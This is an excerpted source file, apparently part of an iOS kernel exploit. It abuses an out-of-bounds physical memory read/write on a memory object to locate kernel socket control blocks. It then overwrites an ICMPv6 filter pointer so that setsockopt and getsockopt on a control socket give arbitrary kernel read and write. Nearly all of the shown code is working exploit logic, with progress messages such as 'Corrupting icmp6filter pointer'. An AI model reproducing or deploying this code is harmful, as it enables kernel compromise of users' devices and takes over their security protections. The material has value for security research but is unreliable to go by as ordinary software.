...
#include <mach/mach.h>
// sys/fileport.h is not in the iOS SDK — declare manually
...
static NSMutableArray<NSNumber *> *socketPorts;
static NSMutableArray<NSNumber *> *socketPcbIds;
#define GETSOCKOPT_READ_LEN 32
static void *getsockoptReadData = NULL;

static volatile uint8_t goSync = 0;
static volatile uint8_t raceSync = 0;
static volatile uint8_t freeThreadStart = 0;
...
static NSMutableDictionary<NSNumber *, id> *gMlockDict;

static int controlSocket = 0;
static int rwSocket = 0;
static uint64_t controlSocketPcb = 0;
static uint64_t rwSocketPcb = 0;
#define EARLY_KRW_LENGTH 0x20
static uint8_t controlData[EARLY_KRW_LENGTH];

void setTargetKaddr(uint64_t where) {
  memset(controlData, 0, EARLY_KRW_LENGTH);
  *(uint64_t *)controlData = where;
  int res = setsockopt(controlSocket, IPPROTO_ICMPV6, ICMP6_FILTER, controlData,
                       EARLY_KRW_LENGTH);
  if (res != 0) {
...
kern_return_t physical_oob_read_mo_with_retry(
  ...
  kern_return_t kr;
  do {
    kr = physical_oob_read_mo(memoryObject, memoryObjectOffset, size, offset,
                              buffer);
...
int find_and_corrupt_socket(mach_port_t memoryObject,
  ...
  if (targetFound) {
    ...
    *(uint64_t *)((uintptr_t)writeBuffer + pcbStartOffset + OFFSET_ICMP6FILT) =
        inpListNextPointer + OFFSET_ICMP6FILT;
    *(uint64_t *)((uintptr_t)writeBuffer + pcbStartOffset + OFFSET_ICMP6FILT +
                  8) = 0;

    printf("[+] Corrupting icmp6filter pointer...\n");
    while (true) {
      physical_oob_write_mo(memoryObject, seekingOffset, OOB_SIZE, OOB_OFFSET,
                            writeBuffer);
      physical_oob_read_mo_with_retry(memoryObject, seekingOffset, OOB_SIZE,
                                      OOB_OFFSET, readBuffer);
    ...
    int res = getsockopt(sock, IPPROTO_ICMPV6, ICMP6_FILTER, getsockoptReadData,
                         &len);
    if (res != 0) {
      printf("[-] getsockopt failed!!!\n");
      FAILURE(0);
    ...
    if (marker != -1) {
      ...
      rwSocket = fileport_makefd(
          (fileport_t)socketPorts[controlSocketIdx + 1].unsignedLongLongValue);
      return KERN_SUCCESS;
    } else {
    ...
    for (uint64_t s = 0; s < searchMappingNum; s++) {
      ...
      while (seekingOffset < searchMappingSize) {
        kr = physical_oob_read_mo(memoryObject, seekingOffset, OOB_SIZE,
                                  OOB_OFFSET, readBuffer);
        if (kr == KERN_SUCCESS) {
          if (find_and_corrupt_socket(memoryObject, seekingOffset, readBuffer,
                                      writeBuffer, targetInpGencntList,
                                      false) == KERN_SUCCESS) {
            success = true;
            break;
          }
